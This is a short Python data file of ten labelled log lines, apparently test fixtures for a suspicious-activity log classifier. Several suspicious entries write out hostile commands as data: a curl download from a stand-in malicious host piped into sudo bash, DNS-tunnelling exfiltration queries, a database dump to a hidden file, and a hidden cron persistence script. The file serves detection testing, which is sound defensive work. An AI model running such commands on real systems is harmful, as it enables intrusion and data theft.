from __future__ import annotations

from typing import List, Tuple


# (log_text, ground_truth_label). Six suspicious lines covering distinct attack
# families (bruteforce, RCE, exfil, persistence, DNS tunneling, in-memory
# payload) and four benign lines of routine ops activity.
LOGS: List[Tuple[str, str]] = [
    ("2026-05-25 03:14:22 sshd[4421]: Failed password for root from 185.220.101.45 port 47823 ssh2 (47 failures in 12s)", "SUSPICIOUS"),
    ("2026-05-25 14:02:11 bash: curl -sL http://malicious.example.com/x.sh | sudo bash -", "SUSPICIOUS"),
    ("2026-05-25 16:11:55 mysqld: SELECT * FROM users INTO OUTFILE '/tmp/.x/dump.sql'; (2.4GB exported, src=185.220.101.45)", "SUSPICIOUS"),
    ("2026-05-25 17:00:00 cron[2211]: (root) CMD (/var/tmp/.systemd-helper.sh > /dev/null 2>&1)", "SUSPICIOUS"),
    ("2026-05-25 19:01:14 named[123]: query a1b2c3d4e5f6.exfil.attacker.com IN TXT NOERROR (312 queries last 60s)", "SUSPICIOUS"),
    ("2026-05-25 21:14:08 auditd: type=EXECVE comm=ld-linux.so argv=[/tmp/.../payload] uid=0 ppid=1", "SUSPICIOUS"),
    ("2026-05-25 09:01:02 sshd[331]: Accepted publickey for ops-deploy from 10.0.4.18 port 51122 ssh2", "BENIGN"),
    ("2026-05-25 09:15:42 apt: Setting up libssl3:amd64 (3.0.11-1ubuntu2.1)", "BENIGN"),
    ('2026-05-25 12:33:01 nginx: 10.0.2.7 - - [12:33:01 +0000] "GET /api/health HTTP/1.1" 200 17', "BENIGN"),
    ("2026-05-25 02:00:00 cron[1001]: (backup) CMD (/usr/local/bin/rsync-nightly.sh)", "BENIGN"),
]
